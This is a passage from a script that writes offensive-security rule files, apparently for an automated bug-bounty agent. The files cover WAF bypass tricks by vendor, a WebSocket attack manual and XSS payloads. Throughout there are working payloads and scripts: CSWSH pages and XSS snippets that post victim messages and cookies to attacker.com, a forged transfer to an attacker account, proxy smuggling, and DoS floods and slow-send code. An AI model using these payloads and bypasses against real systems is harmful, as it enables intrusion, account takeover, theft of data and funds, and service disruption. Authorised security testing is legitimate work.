| UTF-8 BOM injection | `\xEF\xBB\xBF` at start of body may shift parser alignment |
| Large Cookie header | Extremely long Cookie headers may cause truncated inspection |
| WebSocket upgrade | After WebSocket upgrade, subsequent traffic may bypass WAF inspection |

### Imperva-Specific Notes

- Imperva has "Client Classification" — browser fingerprinting. Headless browsers may be blocked before WAF rules even apply. Use real browser fingerprints.
- Imperva's API security module is separate from web WAF — API endpoints may have weaker protection.
- Custom rules in Imperva use "IncapRule" syntax — misconfigurations are common.

---

## 6. F5 BIG-IP ASM / Advanced WAF

### Detection

- `Server: BigIP`, `BIGipServer` cookie, `TS` cookie prefix
- Block page: "The requested URL was rejected" with support ID

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Serialized format bypass | ASM has weak inspection of serialized data (Java, PHP, .NET serialization) |
| JSON/XML content switching | Switch between JSON and XML — ASM may have different rule sets per content type |
| Parameter meta-characters | ASM's "meta-character enforcement" can be bypassed with double encoding |
| Cookie manipulation | ASM sets tracking cookies; modifying them can cause session tracking issues that affect rule application |
| Evasion techniques | ASM has explicit "evasion detection" for directory traversal, multiple encoding, etc. But combinations of techniques may still bypass |
| Learning mode exploitation | If ASM is in "transparent" (learning) mode, no blocking occurs — test with obviously malicious payload first |

### F5-Specific Notes

- BIG-IP ASM distinguishes between "attack signatures" and "violations". Signatures are pattern-based; violations are structural (parameter length, data type). Both must be bypassed.
- ASM's "Bot Defense" module is separate and can be detected via JavaScript challenge injection.
- The `TS` cookie contains session data — tampering with it causes ASM to treat the request as a new session.

---

## 7. Sucuri WAF

### Detection

- `Server: Sucuri/Cloudproxy`, `X-Sucuri-ID` header
- Block page: "Access Denied - Sucuri Website Firewall"

### Known Bypass Techniques

| Category | Technique |
|---|---|
| Tag/event combos | Sucuri blocks common XSS tags but may miss: `<svg/onload>`, `<details/ontoggle>`, `<marquee onstart>` |
| SQL function alternatives | `MID()` instead of `SUBSTRING()`, `CONV()` for hex conversion |
| Path traversal encoding | `..%252f..%252f` (double URL encode) for directory traversal |
| Origin direct access | Sucuri is a reverse proxy; origin IP discovery bypasses it entirely |
| HTTP method switch | Sucuri may have different rules for GET vs POST vs PUT |
| Null byte injection | `%00` in parameter values may truncate Sucuri's inspection |

### Sucuri-Specific Notes

- Sucuri is common on WordPress sites — combine with WordPress-specific attack vectors.
- Sucuri's "Hardening" features (block PHP in uploads, etc.) are separate from WAF rules.
- Free Sucuri tier has significantly weaker WAF rules than paid tiers.

---

## 8. QUICK REFERENCE — BYPASS-BY-WAF CHEAT SHEET

| WAF | Top Bypass Vector | Size Limit | Key Weakness |
|---|---|---|---|
| Cloudflare | Unicode normalization + origin IP | 128KB | Fullwidth chars, free tier gaps |
| AWS WAF | Body size > 8KB | 8KB (body) | Size limit bypass, regex timeout |
| ModSecurity CRS | PL1 gaps + MySQL comments | Configurable | Low paranoia defaults |
| Akamai | Encoding chains + slow POST | Varies | Adaptive engine learning delay |
| Imperva | HPP + JSON nesting | Unknown | Parameter pollution |
| F5 BIG-IP | Serialized data + learning mode | Configurable | Weak serialization inspection |
| Sucuri | Origin IP + alt tags | Unknown | WordPress-centric rules |
TECH_WAF_BYPASS_EOF

seed_rule techniques/websocket-test.md <<'TECH_WEBSOCKET_TEST_EOF'
> 结构：上半原有是主线（握手 / Origin / CSWSH / 注入）；下半补充加深（走私、Socket.IO）。短表没点名时先握手+越权消息。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。仅 Origin 缺失、没有读到/改到他人数据 → 默认不写。

## 一、原有知识库

# WebSocket 安全测试手册

## 一、WebSocket 基础

### 1.1 WebSocket 握手

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 1.2 识别 WebSocket

```bash
# 从 JS 文件中查找
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js

# 从网络请求中查找（使用 js-reverse MCP）
list_network_requests()
# 查找 Upgrade: websocket 的请求
```

---

## 二、Origin 验证绕过

### 2.1 原理

```
WebSocket 连接应验证 Origin 头，防止跨站攻击

正常: Origin: https://target.com → 允许
攻击: Origin: https://attacker.com → 应拒绝

如果服务端不验证或验证不严格 → 跨站 WebSocket 劫持
```

### 2.2 测试方法

```python
import websocket

def test_origin_bypass(ws_url):
    """测试 Origin 验证"""
    
    origins_to_test = [
        "https://attacker.com",
        "https://target.com.attacker.com",
        "https://attacker.com.target.com",
        "null",
        "",
        "https://target.com:@attacker.com",
    ]
    
    for origin in origins_to_test:
        try:
            ws = websocket.create_connection(
                ws_url,
                header=[f"Origin: {origin}"]
            )
            
            print(f"[+] Origin 绕过成功: {origin}")
            
            # 尝试接收消息
            result = ws.recv()
            print(f"    接收到: {result[:100]}")
            
            ws.close()
            
        except Exception as e:
            print(f"[-] Origin 被拒绝: {origin}")
            print(f"    错误: {str(e)[:50]}")
```

### 2.3 Bash 测试

```bash
# websocat 测试
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# wscat 测试
wscat -c wss://target.com/chat --origin https://attacker.com
```

---

## 三、认证测试

### 3.1 认证方式

```
1. URL 参数: wss://target.com/chat?token=xxx
2. Cookie: 握手时自动发送
3. 自定义头: Sec-WebSocket-Protocol: token.xxx
4. 首条消息: {"type": "auth", "token": "xxx"}
```

### 3.2 测试认证缺失

```python
def test_ws_auth(ws_url):
    """测试 WebSocket 认证"""
    
    # 不带任何认证信息连接
    try:
        ws = websocket.create_connection(ws_url)
        
        print("[!] 无需认证即可连接")
        
        # 尝试发送消息
        ws.send('{"type": "message", "content": "test"}')
        
        # 接收响应
        result = ws.recv()
        print(f"响应: {result}")
        
        ws.close()
        
    except Exception as e:
        print(f"连接失败: {e}")
```

### 3.3 Token 重放测试

```python
def test_token_replay(ws_url, old_token):
    """测试 Token 是否可重放"""
    
    # 使用已过期/已注销的 token
    ws_url_with_token = f"{ws_url}?token={old_token}"
    
    try:
        ws = websocket.create_connection(ws_url_with_token)
        print("[!] Token 可重放")
        ws.close()
    except:
        print("[-] Token 不可重放")
```

---

## 四、消息注入

### 4.1 JSON 注入

```python
def test_message_injection(ws_url, token):
    """测试消息注入"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    # 正常消息
    normal_msg = '{"type": "message", "content": "Hello"}'
    ws.send(normal_msg)
    
    # 注入测试
    injection_payloads = [
        # XSS
        '{"type": "message", "content": "<script>alert(1)</script>"}',
        
        # SQL 注入
        '{"type": "search", "query": "test\' OR \'1\'=\'1"}',
        
        # 命令注入
        '{"type": "ping", "host": "127.0.0.1; whoami"}',
        
        # 类型混淆
        '{"type": "message", "userId": {"$ne": null}}',
        
        # 越权
        '{"type": "message", "targetUserId": "VICTIM_ID"}',
    ]
    
    for payload in injection_payloads:
        ws.send(payload)
        try:
            response = ws.recv()
            print(f"Payload: {payload[:50]}")
            print(f"Response: {response[:100]}")
        except:
            pass
    
    ws.close()
```

### 4.2 二进制消息注入

```python
def test_binary_injection(ws_url):
    """测试二进制消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送二进制数据
    binary_payloads = [
        b"\x00\x00\x00\x01",  # 畸形数据
        b"\xff" * 1000,       # 大量数据
        b"A" * 10000,         # 超长数据
    ]
    
    for payload in binary_payloads:
        ws.send_binary(payload)
        try:
            response = ws.recv()
            print(f"Binary payload sent, response: {response[:50]}")
        except:
            pass
    
    ws.close()
```

---

## 五、跨站 WebSocket 劫持（CSWSH）

### 5.1 原理

```
类似 CSRF，但针对 WebSocket

1. 受害者访问攻击者网站
2. 攻击者网站的 JS 连接到目标 WebSocket
3. 浏览器自动发送受害者的 Cookie
4. 攻击者通过 WebSocket 执行操作或窃取数据
```

### 5.2 PoC 页面

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <h1>跨站 WebSocket 劫持 PoC</h1>
    <div id="output"></div>
    
    <script>
        // 连接到目标 WebSocket
        const ws = new WebSocket('wss://target.com/chat');
        
        ws.onopen = function() {
            log('WebSocket 连接成功');
            
            // 发送消息
            ws.send(JSON.stringify({
                type: 'getMessages',
                limit: 100
            }));
        };
        
        ws.onmessage = function(event) {
            log('收到消息: ' + event.data);
            
            // 将数据发送到攻击者服务器
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: event.data
            });
        };
        
        ws.onerror = function(error) {
            log('错误: ' + error);
        };
        
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
        }
    </script>
</body>
</html>
```

### 5.3 防护检测

```python
def test_cswsh_protection(ws_url):
    """检测 CSWSH 防护"""
    
    # 1. 检查是否验证 Origin
    # 2. 检查是否使用 CSRF Token
    # 3. 检查是否验证 Sec-WebSocket-Key
    
    # 从恶意 Origin 连接
    try:
        ws = websocket.create_connection(
            ws_url,
            header=["Origin: https://attacker.com"]
        )
        print("[!] 无 CSWSH 防护（Origin 未验证）")
        ws.close()
    except:
        print("[+] 有 CSWSH 防护（Origin 验证）")
```

---

## 六、信息泄露

### 6.1 敏感数据泄露

```python
def monitor_ws_messages(ws_url, token):
    """监控 WebSocket 消息，查找敏感信息"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    sensitive_patterns = [
        r'\b\d{15,19}\b',  # 信用卡号
        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
        r'\b\d{11}\b',  # 手机号
        r'password',
        r'token',
        r'secret',
    ]
    
    import re
    
    for _ in range(100):
        try:
            msg = ws.recv()
            
            for pattern in sensitive_patterns:
                if re.search(pattern, msg, re.IGNORECASE):
                    print(f"[!] 发现敏感信息: {pattern}")
                    print(f"    消息: {msg[:200]}")
        except:
            break
    
    ws.close()
```

### 6.2 使用 js-reverse MCP 分析

```python
# 使用 js-reverse MCP 的 get_websocket_messages
# 获取所有 WebSocket 消息

# 1. 打开目标页面
# 2. 触发 WebSocket 连接
# 3. 调用 get_websocket_messages()
# 4. 分析消息内容
```

---

## 七、DoS 攻击

### 7.1 大量连接

```python
import threading

def dos_connections(ws_url, count=1000):
    """DoS: 大量连接"""
    
    def connect():
        try:
            ws = websocket.create_connection(ws_url)
            # 保持连接
            while True:
                ws.recv()
        except:
            pass
    
    threads = []
    for _ in range(count):
        t = threading.Thread(target=connect)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
```

### 7.2 大消息攻击

```python
def dos_large_message(ws_url):
    """DoS: 发送超大消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送 10MB 消息
    large_msg = "A" * (10 * 1024 * 1024)
    ws.send(large_msg)
    
    ws.close()
```

### 7.3 慢速攻击

```python
def dos_slow_send(ws_url):
    """DoS: 慢速发送"""
    
    import socket
    import ssl
    import time
    
    # 建立 TCP 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    # 发送 WebSocket 握手（慢速）
    handshake = (
        "GET /chat HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    
    # 每秒发送 1 字节
    for byte in handshake.encode():
        sock.send(bytes([byte]))
        time.sleep(1)
    
    sock.close()
```

---

## 八、测试工具

### 8.1 websocat

```bash
# 安装
# Linux: wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_linux64
# macOS: brew install websocat

# 连接 WebSocket
websocat wss://target.com/chat

# 带自定义头
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# 发送文件内容
cat payload.json | websocat wss://target.com/chat

# 保存接收的消息
websocat wss://target.com/chat > messages.txt
```

### 8.2 wscat

```bash
# 安装
npm install -g wscat

# 连接
wscat -c wss://target.com/chat

# 带 Origin
wscat -c wss://target.com/chat --origin https://attacker.com

# 带自定义头
wscat -c wss://target.com/chat -H "Authorization: Bearer TOKEN"
```

### 8.3 Python websockets 库

```python
import asyncio
import websockets

async def test_websocket():
    uri = "wss://target.com/chat"
    
    async with websockets.connect(uri) as websocket:
        # 发送消息
        await websocket.send('{"type": "message", "content": "test"}')
        
        # 接收消息
        response = await websocket.recv()
        print(f"收到: {response}")

asyncio.run(test_websocket())
```

---

## 九、实战测试流程

### 9.1 信息收集

```
1. 找到 WebSocket 端点（从 JS 文件或网络请求）
2. 分析握手过程（认证方式、Origin 检查）
3. 分析消息格式（JSON/二进制/文本）
4. 识别消息类型（auth/message/command/subscribe）
```

### 9.2 安全测试

```
1. Origin 验证测试
2. 认证测试（无认证/弱认证/Token 重放）
3. 消息注入测试（XSS/SQL/命令注入）
4. 越权测试（访问他人消息/房间）
5. CSWSH 测试
6. 信息泄露测试
7. DoS 测试（谨慎）
```

### 9.3 PoC 编写

```python
# 完整 PoC 示例
import websocket
import json

def exploit_websocket():
    """WebSocket 漏洞利用 PoC"""
    
    # 1. 连接（绕过 Origin 检查）
    ws = websocket.create_connection(
        "wss://target.com/chat",
        header=["Origin: https://attacker.com"]
    )
    
    print("[+] WebSocket 连接成功（Origin 验证绕过）")
    
    # 2. 认证（如果需要）
    auth_msg = json.dumps({
        "type": "auth",
        "token": "STOLEN_TOKEN"
    })
    ws.send(auth_msg)
    
    # 3. 越权访问他人消息
    get_messages = json.dumps({
        "type": "getMessages",
        "userId": "VICTIM_ID"
    })
    ws.send(get_messages)
    
    # 4. 接收响应
    response = ws.recv()
    print(f"[+] 获取到受害者消息: {response}")
    
    # 5. 关闭连接
    ws.close()

exploit_websocket()
```

---

## 十、防护检测

```python
# 检测是否有安全防护

# 1. Origin 验证
# 特征: 非白名单 Origin 被拒绝

# 2. 认证要求
# 特征: 无 Token 无法连接或接收消息

# 3. 速率限制
# 特征: 短时间大量消息被限制

# 4. 消息验证
# 特征: 恶意消息被过滤或拒绝

# 5. CSRF Token
# 特征: 握手时需要 CSRF Token
```

---

## 十二、参考资源

```
# WebSocket 安全
https://portswigger.net/web-security/websockets

# CSWSH
https://christian-schneider.net/CrossSiteWebSocketHijacking.html

# WebSocket 工具
https://github.com/vi/websocat
https://github.com/websockets/wscat
```

---

## 二、补充：websocket

### websocket

### WebSocket Security

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---


## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
### In Burp: intercept the WebSocket upgrade request
### Change Origin header to: https://attacker.com
### If 101 Switching Protocols returned → no Origin validation
### If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

### After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
### Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

### Output: field structure with types and values
### Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

### Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
### data = {'action': 'get_balance', 'user_id': 123}

### Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
### Original: user_id as integer (field type 0)
### Modified: user_id as string "1 OR 1=1" (field type 2)
### If server doesn't validate types after deserialization → SQL injection

### Original: is_admin as boolean false (0x00)
### Modified: is_admin as boolean true (0x01)
### Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
TECH_WEBSOCKET_TEST_EOF

seed_rule techniques/xslt-injection-test.md <<'TECH_XSLT_INJECTION_TEST_EOF'
# xslt-injection-test（几乎不交）

> XSLT 注入没入口 N/A。有模板/转换口按现场 SSTI/XXE 打，走 `injection-test.md` / `xxe-test.md`。
TECH_XSLT_INJECTION_TEST_EOF

seed_rule techniques/xss-test.md <<'TECH_XSS_TEST_EOF'
> 短表「XSS → RCE」「自定义协议 → RCE」用标题搜。英文附件 / polyglot 百科已砍；冷门事件和特权上下文仍留。
> **下面这些 payload 只是加速，不是清单。** 现场按上下文自己选、自己变；表上没有的编码/事件/标签照样打。禁止只轮询本节收过的那几条。

## 一、原有知识库

# XSS 测试手册

## XSS 类型判断

| 类型 | 特征 |
|------|------|
| 存储型 | payload 存入数据库，他人访问触发 |
| 反射型 | payload 在 URL 参数中，需诱导点击 |
| DOM 型 | 纯前端处理，不经过服务端 |

打穿了按 `vuln-report-format` 定级，不按存储/反射/DOM 抬级。

---

## 常见注入点

```
搜索框 → 搜索结果页面
评论/留言区
个人资料（昵称、签名、简介）
文件名（上传后展示）
404/错误页面（显示 URL 参数）
消息通知内容
客服聊天
富文本编辑器
Git / 文档站的 README、Wiki、议题、MR 描述（网页和桌面客户端都测，见 §8 XSS→RCE）
桌面客户端自定义协议（scheme 参数带 url / open / openUrl / webview，见 §8 自定义协议→RCE）
回跳参数 backUrl / returnUrl / redirect / next（javascript: 或 javascript%3A + document.write(document.cookie)）
富文本 / BBCode / wiki（`[p]` `[[p]]` `[div]` 转 HTML 时属性跟上；页面有 Layui/animate.css 就挂现成动画 class + onanimationstart）
```

---

## 基础 Payload

```html
<!-- 基础验证 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 无 script 标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- 属性注入（闭合属性）-->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF 绕过 Payload

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- 事件多样化 -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 冷门自动事件：onerror/onload 被剥时用。未知标签也能挂。内联作用域里 cookie 就是 document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- 未知标签被剥时换 input；只要 content-visibility:auto，不必 display:block -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover：style 被剥时换这条。要点一下按钮。内联 URL 就是 document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- 编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- 注释分割 -->
<scr<!--注释-->ipt>alert(1)</scr<!--注释-->ipt>

<!-- 使用反引号 -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie 窃取 Payload

```html
<!-- 发送 Cookie 到攻击者服务器 -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch 版本（更可靠） -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC 验证（无需真实接收，用 dnslog 即可）-->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## DOM XSS 查找

```javascript
// 搜索危险接收点
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// 常见 DOM XSS 源
document.location.hash    // #后面的内容
document.location.search  // ?后面的参数
document.referrer
window.name
postMessage
```

---

## XSS 证明方式（SRC 要求）

对于 SRC 提交，**禁止使用 alert(1)** 证明危害，应使用：

```javascript
// 证明能读取 Cookie
alert(document.cookie)
// 内联事件里可写成 a=alert,a(cookie) 或 a=alert,a(URL)（作用域就是 document.cookie / document.URL）

// 证明能读取 token（localStorage）
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// 证明 domain（证明不是 self-xss）
alert(document.domain)
```

---

### 冷门事件 + 内联作用域（onerror/onload 被拦时）

